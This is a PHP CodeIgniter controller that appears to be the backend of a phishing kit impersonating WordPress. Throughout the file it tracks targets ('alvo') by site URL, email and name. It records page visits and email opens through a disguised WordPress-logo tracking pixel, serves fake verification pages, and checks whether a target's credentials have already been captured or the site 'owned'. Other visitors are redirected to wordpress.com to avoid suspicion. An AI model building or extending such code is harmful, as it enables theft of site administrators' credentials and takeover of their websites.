<?php
defined('BASEPATH') or exit('No direct script access allowed');

class Checkup extends CI_Controller
{

    function __construct()
    {

        parent::__construct();

        $this->load->model('main_model');
    }

    public function index()
    {

        if ($this->input->get()) {

            $data = array();

            $data['alvo_url'] = htmlspecialchars($this->input->get('u'));
            $data['alvo_email'] = htmlspecialchars($this->input->get('e'));
            $data['alvo_nome'] = htmlspecialchars($this->input->get('a'));

            $data['alvo_language'] = htmlspecialchars($this->input->get('lang'));


            if ($this->main_model->is_alvo_owned($data['alvo_url'])) {
                header('Location:https://' . $data['alvo_url'] . '/wp-admin');
            }

            // Registra que acessou a página.
            $alvo_payload = "Visitou CheckUp";
            $alvo_type = "acesso";

            $this->main_model->register_payload_log($alvo_payload, $data['alvo_url'], $data['alvo_email'], $data['alvo_language'], $alvo_type);



            if (empty($data['alvo_url']) ||  empty($data['alvo_email'] || empty($data['alvo_nome']))) {
                header('Location:https://wordpress.com');
            }

            if ($data['alvo_language'] == "pt") {

                $this->load->view('users/verification_pt', $data);
            } else if ($data['alvo_language'] == "en") {

                $this->load->view('users/verification_en', $data);
            } else {

                $this->load->view('users/verification_en', $data);
            }
        } else {
            header('Location:https://wordpress.com');
        }
    }

    public function update()
    {
        if ($this->input->get()) {

            $data = array();

            $data['alvo_url'] = htmlspecialchars($this->input->get('u'));
            $data['alvo_email'] = htmlspecialchars($this->input->get('e'));
            $data['alvo_nome'] = htmlspecialchars($this->input->get('a'));




            // Registra que acessou a página.
            $this->main_model->addCountAlvoPaginaAbertura($data['alvo_url'], $data['alvo_email']);

            if ($this->main_model->existCredenciais($data['alvo_url'])) {
                header('Location:https://wordpress.com');
            }

            $this->load->view('users/verification_payload_two', $data);
        } else {
            header('Location:https://wordpress.com');
        }
    }

    public function success()
    {
        if ($this->input->get()) {

            $data = array();

            $data['alvo_url'] = htmlspecialchars($this->input->get('u'));
            $data['alvo_language'] = htmlspecialchars($this->input->get('lang'));




            // Registra que acessou a página.

            // if ($this->main_model-> existCredenciais($data['alvo_url']) ) {
            //     header('Location:https://wordpress.com');
            // }

            if ($data['alvo_language'] == "pt") {

                $this->load->view('users/success_pt', $data);
            } else if ($data['alvo_language'] == "en") {

                $this->load->view('users/success_en', $data);
            } else {

                $this->load->view('users/success_en', $data);
            }
        } else {
            header('Location:https://wordpress.com');
        }
    }


    public function email_ping()
    {
        $alvo_url = htmlspecialchars($this->input->get('u'));
        $alvo_email = htmlspecialchars($this->input->get('e'));

        $this->main_model->addCountAlvoEmail($alvo_url, $alvo_email);


        $imagemSubstituta = './assets/wordpress-logo.svg';
        header('Content-Type: image/svg+xml');
        readfile($imagemSubstituta);
    }

    public function verification($alvo_ref)
    {
        $alvo = $this->main_model->getAlvoByRef($alvo_ref);
        header('Location:' . base_url() . 'checkup?u=' . $alvo['alvo_url'] . '&e=' . $alvo['alvo_email'] . '&a=' . $alvo['alvo_nome']);
    }
}
